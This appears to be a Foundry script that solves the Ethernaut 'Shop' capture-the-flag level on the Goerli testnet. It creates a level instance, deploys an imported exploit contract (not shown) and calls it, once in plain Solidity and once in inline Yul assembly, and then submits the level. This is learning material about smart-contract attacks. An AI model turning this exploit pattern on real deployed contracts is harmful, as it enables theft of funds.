// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { ShopExploit } from "../../contracts/21_Shop.sol";

interface Instance {
    function price() external view returns (uint);

    function isSold() external view returns (bool);

    function buy() external;
}

contract ShopScript is EthernautScript {
    string network = "goerli";
    address level = 0xCb1c7A4Dee224bac0B47d0bE7bb334bac235F842;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        ShopExploit exploit = new ShopExploit();
        exploit.exploit(address(instance));
    }

    function yulVersion() internal {
        bytes memory initCode = type(ShopExploit).creationCode;
        assembly {
            let exploit := create(0, add(initCode, 0x20), mload(initCode))

            mstore(0, "exploit(address)")
            mstore(0, keccak256(0, 16))
            mstore(4, sload(instance.slot))
            let success := call(gas(), exploit, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
